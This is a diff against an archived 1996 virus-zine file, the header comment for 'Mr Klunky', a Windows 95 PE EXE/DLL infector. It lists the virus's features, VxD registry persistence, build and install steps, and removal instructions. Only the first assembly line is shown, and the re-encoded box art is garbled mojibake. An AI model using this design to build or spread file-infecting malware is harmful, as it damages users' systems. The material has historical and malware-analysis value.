@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      M
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 Insane Reality issue #8 - (c)opyright 1996 Immortal Riot/Genesis - REALITY.022
 
 Article: Mr Klunky
@@ -35,171 +46,171 @@ Files Included: MRKLUNKY.ASM
 ;=[BEGIN MRKLUNKY.ASM]=======================================================
 
 Comment @
- ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
- ³                                                                            ³
- ³ o       o           oo     ooo   o                        o                ³
- ³ooo     ooo         ooo     oo   oo                       oo                ³
- ³ ooo   ooo           oo    oo   ooo                      ooo                ³
- ³ oooo oooo           oo   oo     oo                       oo                ³
- ³ oo ooo oo   o  oo   oo  oo      oo oooo ooo   ooo ooo    oo  oooo ooo   oo ³
- ³ oo  o  oo  ooooooo  oo oo       oo  oo   ooo ooo ooooo   oo   oo   oo   ooo³
- ³ oo     oo   ooo  o  oooo        oo  oo   oo   oooo  oo   ooo oo    oo   oo ³
- ³ oo     oo   oo      oo oo       oo  oo   oo   ooo   oo   ooooo     oo   oo ³
- ³ oo     oo   oo      oo  oo      oo  oo   oo   oo    oo   oo oo     oo   oo ³
- ³ oo     oo   oo      oo   oo     oo  oo   oo   oo    oo   oo  oo    oo   oo ³
- ³ oo     oo   oo      oo    oo    oo  oo   oo   oo    oo   oo   oo   oo   oo ³
- ³ oo     oo   oo      oo     oo   oo   oooooo   oo    oo   oo    oo   oooooo ³
- ³oooo   oooo oooo    oooo    ooo oooo   ooo oo oooo  oooo oooo  oooo   ooooo ³
- ³                                                                         oo ³
- ³                                                                         oo ³
- ³  o                                 b y                                  oo ³
- ³ oo                                                                      oo ³
- ³ooo                                D V 8                                 oo ³
- ³ oo                                                                      oo ³
- ³ oo                                 o f                                  oo ³
- ³ oo                                                                      oo ³
- ³ oo              I m m o r t a l  R i o t  /  G e n e s i s              oo ³
- ³ oo                                                                      oo ³
- ³ oo                                                                      oo ³
- ³ oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo ³
- ³  oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo  ³
- ³                                                                            ³
- ÆÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
- ³                                                                            ³
- ³                                                                            ³
- ³               Dedicated (by an old Smurfophiliac) to smurfs                ³
- ³                                                                            ³
- ³                   everywhere, particularly Smurfette...                    ³
- ³                                                                            ³
- ³                           Mmmmmm.. What a babe!                            ³
- ³                                                                            ³
- ³                                                                            ³
- ÆÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
- ³                                                                            ³
- ³ Versions      o Depends on which way you compile it...                     ³
- ³                 1.00 - PE EXE infection.                                   ³
- ³                 1.01 - PE EXE infection in debug mode (published version). ³
- ³                 1.02 - PE EXE/DLL infection.                               ³
- ³                 1.03 - PE EXE/DLL infection in debug mode.                 ³
- ³                                                                            ³
- ³ Alias         o Mr K, MrK and anything else the AV come up with ;]         ³
- ³                                                                            ³
- ³ Origin        o Australia.                                                 ³
- ³                                                                            ³
- ³ Release Date  o Friday the 13th of December 1996.                          ³
- ³                                                                            ³
- ³ Platform      o PC running Windows 95.                                     ³
- ³                                                                            ³
- ³ Type          o Resident fast PE infector, infects Windows 95 boot         ³
- ³                 process.                                                   ³
- ³                                                                            ³
- ³ Targets       o .EXE (or .DLL) files of the PE type.                       ³
- ³                                                                            ³
- ³ Size          o Depends on which version you have.                         ³
- ³               o Version 1.00                                               ³
- ³                 Infected EXE/DLL files increase in size by 7791 bytes.     ³
- ³                 Driver (VxD) file size is 6631 bytes.                      ³
- ³               o Version 1.01                                               ³
- ³                 Infected EXE/DLL files increase in size by 7939 bytes.     ³
- ³                 Driver (VxD) file size is 6779 bytes.                      ³
- ³               o Version 1.02                                               ³
- ³                 Infected EXE/DLL files increase in size by 7799 bytes.     ³
- ³                 Driver (VxD) file size is 6639 bytes.                      ³
- ³               o Version 1.03                                               ³
- ³                 Infected EXE/DLL files increase in size by 7951 bytes.     ³
- ³                 Driver (VxD) file size is 6791 bytes.                      ³
- ³               o The "real" size of the actual code is approx 3KB. The rest ³
- ³                 of the size is mostly blank space, thanks to MASM (yech)!  ³
- ³                                                                            ³
- ³ Payload       o None.                                                      ³
- ³                                                                            ³
- ³ Features      o Infects all eligible files opened for any reason.          ³
- ³               o Saves, bypasses and restores file attributes.              ³
- ³               o Fully compliant Windows 95 approach, which should          ³
- ³                 guarantee compatability with future Windows 95 upgrades    ³
- ³                 (with the exception of the following item).                ³
- ³               o Reliably and compatably locates the entry point for needed ³
- ³                 KERNEL32.DLL functions, regardless of Windows 95 version.  ³
- ³                 This allows needed system functions to be called at need.  ³
- ³               o Creates a driver (VxD) file and adds an entry to the       ³
- ³                 registry so that it is loaded whenever Windows 95 starts   ³
- ³                 (thus infecting the Win 95 "boot" process).                ³
- ³               o Correctly locates the actual windows and/or system         ³
- ³                 directories.                                               ³
- ³               o Uses dynamic memory allocation, reducing various system    ³
- ³                 footprints dramatically.                                   ³
- ³               o Passes control to origional host with all registers clean  ³
- ³                 and environment preserved.                                 ³
- ³               o No polymorphism.                                           ³
- ³               o No encryption.                                             ³
- ³               o No retrovirus functionality.                               ³
- ³               o No anti-heusitic stuff.                                    ³
- ³               o No stealth.                                                ³
- ³               o No tunnelling type stuff.                                  ³
- ³               o No code armouring.                                         ³
- ³                                                                            ³
- ³ Compiling     o MASM 6.11 (you'll need the Windows 95 DDK .INC files too). ³
- ³                 Ignore the compile errors.                                 ³
- ³                                                                            ³
- ³ Installation  o Just run LOAD.EXE from a DOS shell inside Win 95.          ³
- ³                                                                            ³
- ³ Removal       o Reboot infected PC.                                        ³
- ³               o Press <F8> at the "Starting Windows 95..."                 ³
- ³               o Select the "Command Prompt Only" option.                   ³
- ³               o Delete all infected files (if you ran a debug verison of   ³
- ³                 Mr Klunky C:\LOG.LOG will contain a list of all infected   ³
- ³                 file).                                                     ³
- ³               o Restore all standard DOS 8.3 named files in the C:\WINDOWS ³
- ³                 and C:\WINDOWS\SYSTEM directories.                         ³
- ³               o Boot into Windows 95 (you will get an error about the VxD  ³
- ³                 Mr Klunky uses being missing, ignore this).                ³
- ³               o Restore all missing files (you _DID_ make a backup didn't  ³
- ³                 you?!).                                                    ³
- ³               o Run REGEDIT.EXE and do a search for a key called           ³
- ³                 "MrKlunky" and delete it.                                  ³
- ³                                                                            ³
- ³ Scanning      o Well... Any signature scanner will be able to spot it      ³
- ³                 after it is next updated.                                  ³
- ³               o Any self checking PE file will spot it.                    ³
- ³               o Any integrity checker will spot it.                        ³
- ³               o Hey! This is an educational version! WTF did you expect    ³
- ³                 from it!!!                                                 ³
- ³                                                                            ³
- ³ Side effects  o Nothing important I know of... MS would need to make some  ³
- ³                 pretty fundamental OS changes in Windows 95.               ³
- ³               o No infected file will run under NT |]                      ³
- ³                                                                            ³
- ³ To do's       o Just look at the "Features" section!                       ³
- ³               o Other bits I removed to go back in.                        ³
- ³               o Some alternative (and even more compatable) ideas to be    ³
- ³                 tried instead of the approaches used.                      ³
- ³                                                                            ³
- ³ Greetz        o Sepultura (look! It's ready for the Zine!)                 ³
- ³               o Metabolis (Injected with the poison.)                      ³
- ³               o Qark (Hullo? Anyone seen this worthy?)                     ³
- ³               o TZ (Sigh... Repetition.)                                   ³
- ³               o Priest (Where TF are you anyway??)                         ³
- ³               o Dark Angel (Everyone seems to have vanished!)              ³
- ³               o Halflife (Wewp! A live one!)                               ³
- ³               o Jookie (Hey dude.)                                         ³
- ³               o KD (Told ya this was here!)                                ³
- ³               o Quantum (Hope ya like Mr K bud.)                           ³
- ³               o The Unforgiven (Email, email, email...)                    ³
- ³               o Anyone else I missed ;] You all know I love you |}         ³
- ³                                                                            ³
- ³ Other notes   o Please remember that this is an, um, scholarly version     ³
- ³                 only. It won't last 5 minutes in the wild, so don't even   ³
- ³                 think of releasing it or of criticising me for anything    ³
- ³                 about it!                                                  ³
- ³               o Make sure you read the article first!                      ³
- ³               o Be damn careful if you play with a non-debug version!      ³
- ³                 I infected my machine inadvertantly heaps of times :(      ³
- ³                 Twice it was with a non-debug version. Doh! Had to restore ³
- ³                 from backup!                                               ³
- ³               o Enjoy!                                                     ³
- ³                                                                            ³
- ³                                                                    -DV8/IRG³
- ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿
+ ï¿½                                                                            ï¿½
+ ï¿½ o       o           oo     ooo   o                        o                ï¿½
+ ï¿½ooo     ooo         ooo     oo   oo                       oo                ï¿½
+ ï¿½ ooo   ooo           oo    oo   ooo                      ooo                ï¿½
+ ï¿½ oooo oooo           oo   oo     oo                       oo                ï¿½
+ ï¿½ oo ooo oo   o  oo   oo  oo      oo oooo ooo   ooo ooo    oo  oooo ooo   oo ï¿½
+ ï¿½ oo  o  oo  ooooooo  oo oo       oo  oo   ooo ooo ooooo   oo   oo   oo   oooï¿½
+ ï¿½ oo     oo   ooo  o  oooo        oo  oo   oo   oooo  oo   ooo oo    oo   oo ï¿½
+ ï¿½ oo     oo   oo      oo oo       oo  oo   oo   ooo   oo   ooooo     oo   oo ï¿½
+ ï¿½ oo     oo   oo      oo  oo      oo  oo   oo   oo    oo   oo oo     oo   oo ï¿½
+ ï¿½ oo     oo   oo      oo   oo     oo  oo   oo   oo    oo   oo  oo    oo   oo ï¿½
+ ï¿½ oo     oo   oo      oo    oo    oo  oo   oo   oo    oo   oo   oo   oo   oo ï¿½
+ ï¿½ oo     oo   oo      oo     oo   oo   oooooo   oo    oo   oo    oo   oooooo ï¿½
+ ï¿½oooo   oooo oooo    oooo    ooo oooo   ooo oo oooo  oooo oooo  oooo   ooooo ï¿½
+ ï¿½                                                                         oo ï¿½
+ ï¿½                                                                         oo ï¿½
+ ï¿½  o                                 b y                                  oo ï¿½
+ ï¿½ oo                                                                      oo ï¿½
+ ï¿½ooo                                D V 8                                 oo ï¿½
+ ï¿½ oo                                                                      oo ï¿½
+ ï¿½ oo                                 o f                                  oo ï¿½
+ ï¿½ oo                                                                      oo ï¿½
+ ï¿½ oo              I m m o r t a l  R i o t  /  G e n e s i s              oo ï¿½
+ ï¿½ oo                                                                      oo ï¿½
+ ï¿½ oo                                                                      oo ï¿½
+ ï¿½ oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo ï¿½
+ ï¿½  oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo  ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Íµ
+ ï¿½                                                                            ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½               Dedicated (by an old Smurfophiliac) to smurfs                ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½                   everywhere, particularly Smurfette...                    ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½                           Mmmmmm.. What a babe!                            ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Íµ
+ ï¿½                                                                            ï¿½
+ ï¿½ Versions      o Depends on which way you compile it...                     ï¿½
+ ï¿½                 1.00 - PE EXE infection.                                   ï¿½
+ ï¿½                 1.01 - PE EXE infection in debug mode (published version). ï¿½
+ ï¿½                 1.02 - PE EXE/DLL infection.                               ï¿½
+ ï¿½                 1.03 - PE EXE/DLL infection in debug mode.                 ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Alias         o Mr K, MrK and anything else the AV come up with ;]         ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Origin        o Australia.                                                 ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Release Date  o Friday the 13th of December 1996.                          ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Platform      o PC running Windows 95.                                     ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Type          o Resident fast PE infector, infects Windows 95 boot         ï¿½
+ ï¿½                 process.                                                   ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Targets       o .EXE (or .DLL) files of the PE type.                       ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Size          o Depends on which version you have.                         ï¿½
+ ï¿½               o Version 1.00                                               ï¿½
+ ï¿½                 Infected EXE/DLL files increase in size by 7791 bytes.     ï¿½
+ ï¿½                 Driver (VxD) file size is 6631 bytes.                      ï¿½
+ ï¿½               o Version 1.01                                               ï¿½
+ ï¿½                 Infected EXE/DLL files increase in size by 7939 bytes.     ï¿½
+ ï¿½                 Driver (VxD) file size is 6779 bytes.                      ï¿½
+ ï¿½               o Version 1.02                                               ï¿½
+ ï¿½                 Infected EXE/DLL files increase in size by 7799 bytes.     ï¿½
+ ï¿½                 Driver (VxD) file size is 6639 bytes.                      ï¿½
+ ï¿½               o Version 1.03                                               ï¿½
+ ï¿½                 Infected EXE/DLL files increase in size by 7951 bytes.     ï¿½
+ ï¿½                 Driver (VxD) file size is 6791 bytes.                      ï¿½
+ ï¿½               o The "real" size of the actual code is approx 3KB. The rest ï¿½
+ ï¿½                 of the size is mostly blank space, thanks to MASM (yech)!  ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Payload       o None.                                                      ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Features      o Infects all eligible files opened for any reason.          ï¿½
+ ï¿½               o Saves, bypasses and restores file attributes.              ï¿½
+ ï¿½               o Fully compliant Windows 95 approach, which should          ï¿½
+ ï¿½                 guarantee compatability with future Windows 95 upgrades    ï¿½
+ ï¿½                 (with the exception of the following item).                ï¿½
+ ï¿½               o Reliably and compatably locates the entry point for needed ï¿½
+ ï¿½                 KERNEL32.DLL functions, regardless of Windows 95 version.  ï¿½
+ ï¿½                 This allows needed system functions to be called at need.  ï¿½
+ ï¿½               o Creates a driver (VxD) file and adds an entry to the       ï¿½
+ ï¿½                 registry so that it is loaded whenever Windows 95 starts   ï¿½
+ ï¿½                 (thus infecting the Win 95 "boot" process).                ï¿½
+ ï¿½               o Correctly locates the actual windows and/or system         ï¿½
+ ï¿½                 directories.                                               ï¿½
+ ï¿½               o Uses dynamic memory allocation, reducing various system    ï¿½
+ ï¿½                 footprints dramatically.                                   ï¿½
+ ï¿½               o Passes control to origional host with all registers clean  ï¿½
+ ï¿½                 and environment preserved.                                 ï¿½
+ ï¿½               o No polymorphism.                                           ï¿½
+ ï¿½               o No encryption.                                             ï¿½
+ ï¿½               o No retrovirus functionality.                               ï¿½
+ ï¿½               o No anti-heusitic stuff.                                    ï¿½
+ ï¿½               o No stealth.                                                ï¿½
+ ï¿½               o No tunnelling type stuff.                                  ï¿½
+ ï¿½               o No code armouring.                                         ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Compiling     o MASM 6.11 (you'll need the Windows 95 DDK .INC files too). ï¿½
+ ï¿½                 Ignore the compile errors.                                 ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Installation  o Just run LOAD.EXE from a DOS shell inside Win 95.          ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Removal       o Reboot infected PC.                                        ï¿½
+ ï¿½               o Press <F8> at the "Starting Windows 95..."                 ï¿½
+ ï¿½               o Select the "Command Prompt Only" option.                   ï¿½
+ ï¿½               o Delete all infected files (if you ran a debug verison of   ï¿½
+ ï¿½                 Mr Klunky C:\LOG.LOG will contain a list of all infected   ï¿½
+ ï¿½                 file).                                                     ï¿½
+ ï¿½               o Restore all standard DOS 8.3 named files in the C:\WINDOWS ï¿½
+ ï¿½                 and C:\WINDOWS\SYSTEM directories.                         ï¿½
+ ï¿½               o Boot into Windows 95 (you will get an error about the VxD  ï¿½
+ ï¿½                 Mr Klunky uses being missing, ignore this).                ï¿½
+ ï¿½               o Restore all missing files (you _DID_ make a backup didn't  ï¿½
+ ï¿½                 you?!).                                                    ï¿½
+ ï¿½               o Run REGEDIT.EXE and do a search for a key called           ï¿½
+ ï¿½                 "MrKlunky" and delete it.                                  ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Scanning      o Well... Any signature scanner will be able to spot it      ï¿½
+ ï¿½                 after it is next updated.                                  ï¿½
+ ï¿½               o Any self checking PE file will spot it.                    ï¿½
+ ï¿½               o Any integrity checker will spot it.                        ï¿½
+ ï¿½               o Hey! This is an educational version! WTF did you expect    ï¿½
+ ï¿½                 from it!!!                                                 ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Side effects  o Nothing important I know of... MS would need to make some  ï¿½
+ ï¿½                 pretty fundamental OS changes in Windows 95.               ï¿½
+ ï¿½               o No infected file will run under NT |]                      ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ To do's       o Just look at the "Features" section!                       ï¿½
+ ï¿½               o Other bits I removed to go back in.                        ï¿½
+ ï¿½               o Some alternative (and even more compatable) ideas to be    ï¿½
+ ï¿½                 tried instead of the approaches used.                      ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Greetz        o Sepultura (look! It's ready for the Zine!)                 ï¿½
+ ï¿½               o Metabolis (Injected with the poison.)                      ï¿½
+ ï¿½               o Qark (Hullo? Anyone seen this worthy?)                     ï¿½
+ ï¿½               o TZ (Sigh... Repetition.)                                   ï¿½
+ ï¿½               o Priest (Where TF are you anyway??)                         ï¿½
+ ï¿½               o Dark Angel (Everyone seems to have vanished!)              ï¿½
+ ï¿½               o Halflife (Wewp! A live one!)                               ï¿½
+ ï¿½               o Jookie (Hey dude.)                                         ï¿½
+ ï¿½               o KD (Told ya this was here!)                                ï¿½
+ ï¿½               o Quantum (Hope ya like Mr K bud.)                           ï¿½
+ ï¿½               o The Unforgiven (Email, email, email...)                    ï¿½
+ ï¿½               o Anyone else I missed ;] You all know I love you |}         ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½ Other notes   o Please remember that this is an, um, scholarly version     ï¿½
+ ï¿½                 only. It won't last 5 minutes in the wild, so don't even   ï¿½
+ ï¿½                 think of releasing it or of criticising me for anything    ï¿½
+ ï¿½                 about it!                                                  ï¿½
+ ï¿½               o Make sure you read the article first!                      ï¿½
+ ï¿½               o Be damn careful if you play with a non-debug version!      ï¿½
+ ï¿½                 I infected my machine inadvertantly heaps of times :(      ï¿½
+ ï¿½                 Twice it was with a non-debug version. Doh! Had to restore ï¿½
+ ï¿½                 from backup!                                               ï¿½
+ ï¿½               o Enjoy!                                                     ï¿½
+ ï¿½                                                                            ï¿½
+ ï¿½                                                                    -DV8/IRGï¿½
+ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 @
   .386p
 
